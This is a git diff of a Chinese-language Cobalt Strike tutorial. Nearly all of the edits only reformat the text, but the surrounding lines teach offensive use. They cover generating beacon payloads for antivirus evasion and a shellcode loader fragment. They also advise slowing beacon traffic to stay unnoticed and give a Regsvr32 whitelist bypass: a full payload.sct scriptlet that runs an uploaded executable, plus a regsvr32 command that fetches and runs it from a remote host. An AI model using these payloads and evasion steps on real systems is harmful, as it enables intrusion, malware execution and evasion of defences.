@@ -1,6 +1,7 @@
-#0x00 Listeners介绍
+# 0x00 Listeners介绍
 
 在本版本Cobalt Strike 3.12中 提供了如图 8种Listeners(监听器)
+
 ![Cobalt Strike ](./img/2.1.png)
 
 >windows/beacon_dns/reverse_dns_txt
@@ -21,14 +22,20 @@ windows/foreign/reverse_tcp
 # 0x01 创建一个服务
 
 创建一个服务首先配置一个监听器 本文介绍http(https) 
+
 ![Cobalt Strike ](./img/2.2.png)
+
 选择 Packages>Windows Executable
+
 ![Cobalt Strike ](./img/2.3.png)
+
 其中可以生成 EXE,DLL 32位系统或者64位，但是大多数我们生成Payload来做免杀
+
 ![Cobalt Strike ](./img/2.4.png)
+
 上线成功 在 Event Log处 出现上线信息 一个团队当然离不开交流 当你在Event Log直接输出内容后 全团队可见 ，输入`/msg name xxx` 给指定用户
 
-#0x02 Beacon
+# 0x02 Beacon
 
 右键目标`interact`来使用`Beacon`，我们用它来执行各种命令，在第一课已经讲到
 `help` 获得所有命令及其简介 `help 具体命令` 来获得详细用法。在Cobalt Strike中它的心跳默认是60s 这会让我们执行的命令响应很慢，在下载文件面前更为明显，所以我在测试时会把时间降低一点 。大家可以根据实战环境来调节，建议不要太快，不然流量会相对明显。
@@ -62,6 +69,7 @@ void main()
 	((void(*)(void))&shellcode)();
 }
 ```
+
 编译记得使用Release模式而不是Debug 生成，其中shellcode加载器方法来自于网络，后期关于免杀将会讲到其他，本文顺带将一下白名单Regsvr32执行。
 
 # 0x04 白名单执行
@@ -69,6 +77,7 @@ void main()
 讲到payload生成服务 不得不讲下关于生成dll文件 利用window的Regsvr32程序
 
 ## Regsvr32简介：
+
 Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。WinXP及以上系统的regsvr32.exe在windows\system32文件夹下；2000系统的regsvr32.exe在winnt\system32文件夹下。下面是常用参数，其他参数请见[链接](https://support.microsoft.com/en-us/help/249873/how-to-use-the-regsvr32-tool-and-troubleshoot-regsvr32-error-messages )
 
 ```
@@ -82,6 +91,7 @@ Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统
 
 ```
 ## 第一种
+
 命令 `regsvr32  c:\artifact.dll` 
 
 ![Cobalt Strike ](./img/2.7.png) 
@@ -89,6 +99,7 @@ Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统
 ## 第二种
 通过 sct 远程执行绕过防病毒这里前提需要将 exe 文件上传到目标主机 本文上传到c:\test.exe
 payload.sct文件内容如下:
+
 ```
 <?XML version="1.0"?>
 <scriptlet>
@@ -105,15 +116,19 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd /k c:\\test.exe");
 </registration>
 </scriptlet>
 ```
+
 上面代码可以上传到Github等白名单域名 本文使用Cobalt Strike自带的服务来搭建 顺便介绍功能
 
 打开>Web Drive-by>Host File 
+
 ![Cobalt Strike ](./img/2.8.png) 
 
 然后执行
+
 `regsvr32 /u /n /s /i:http://192.168.130.130:80/payload.sct scrobj.dll`
 
 执行效果目标机 
+
 ![Cobalt Strike ](./img/2.9.png) 
 
 
